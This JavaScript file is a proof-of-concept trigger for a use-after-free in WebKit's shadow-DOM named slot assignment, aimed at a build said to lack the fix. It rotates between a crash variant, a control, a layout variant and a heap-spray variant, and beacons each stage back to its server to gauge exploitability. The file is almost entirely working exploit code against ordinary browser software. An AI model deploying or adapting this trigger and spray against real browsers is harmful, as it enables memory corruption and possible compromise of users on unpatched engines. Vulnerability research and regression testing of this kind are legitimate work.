// p500 — NamedSlotAssignment UAF (BZ 312247, fix 20beac1f6e, absent in WK-1400).
// Exact upstream regression shape:
//   shadowRoot -> container -> [slot name=X, slot name=X]
//   host child slot=X  + 12 host children with fresh slot names
//   container.replaceChildren()  ->  hasAssignedNodes() mutates m_slots
//   while resolveSlotsAfterSlotMutation iterates m_slots.values().
// Variants (one per load, cursor in localStorage):
//   0 crash   : exact original
//   1 control : slot1.assignedNodes() + layout before the trigger (expected survive)
//   2 spray   : 200 x 144-byte ArrayBuffers before the trigger
//   3 layout  : host.offsetWidth before the trigger
(function () {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();
  var staged = [];
  ['BOOT','BUILT','PRE','TRIGGER','POST','DONE','ERR','HTMLERR']
    .forEach(function (n) {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V500-' + n);
      staged.push([n, x]);
    });
  function S(name, body) {
    try {
      for (var i = 0; i < staged.length; i++)
        if (staged[i][0] === name) { staged[i][1].send('[' + (Date.now() - T0) + 'ms] ' + (body || '')); return; }
    } catch (e) {}
  }

  var VARIANTS = ['crash', 'control', 'spray', 'layout'];
  var vi = 0;
  try {
    vi = parseInt(localStorage.getItem('p500var') || '0', 10);
    if (isNaN(vi) || vi < 0) vi = 0;
    if (vi >= VARIANTS.length) vi = 0;
    localStorage.setItem('p500var', String((vi + 1) % VARIANTS.length));
  } catch (e) {}
  var variant = VARIANTS[vi];
  S('BOOT', 'variant=' + variant + ' idx=' + vi + ' ' + navigator.userAgent);

  var host, sr, container, slot1, slot2, match;
  try {
    host = document.createElement('div');
    document.body.appendChild(host);
    sr = host.attachShadow({ mode: 'open' });
    container = document.createElement('div');
    sr.appendChild(container);
    slot1 = document.createElement('slot');
    slot1.setAttribute('name', 'X');
    container.appendChild(slot1);
    slot2 = document.createElement('slot');
    slot2.setAttribute('name', 'X');
    container.appendChild(slot2);
    match = document.createElement('span');
    match.setAttribute('slot', 'X');
    host.appendChild(match);
    for (var i = 0; i < 12; i++) {
      var sp = document.createElement('span');
      sp.setAttribute('slot', 'new' + i);
      host.appendChild(sp);
    }
  } catch (e) {
    S('ERR', 'build ' + String(e && e.message).substring(0, 60));
    return;
  }
  S('BUILT', 'slots=2 match=1 fresh=12');

  if (variant === 'control') {
    try { slot1.assignedNodes(); host.offsetWidth; } catch (e) {}
    S('PRE', 'assignedNodes+layout');
  } else if (variant === 'layout') {
    try { host.offsetWidth; } catch (e) {}
    S('PRE', 'layout');
  } else if (variant === 'spray') {
    var spray = [];
    for (var s = 0; s < 200; s++) {
      var ab = new ArrayBuffer(144);
      new Uint8Array(ab).fill(0x41);
      spray.push(ab);
    }
    window.__p500spray = spray;
    S('PRE', 'spray200x144');
  } else {
    S('PRE', 'none');
  }

  S('TRIGGER', 'replaceChildren');
  try {
    container.replaceChildren();
  } catch (e) {
    S('ERR', 'trigger ' + String(e && e.message).substring(0, 60));
    return;
  }
  S('POST', 'survived');
  S('DONE', '');
})();
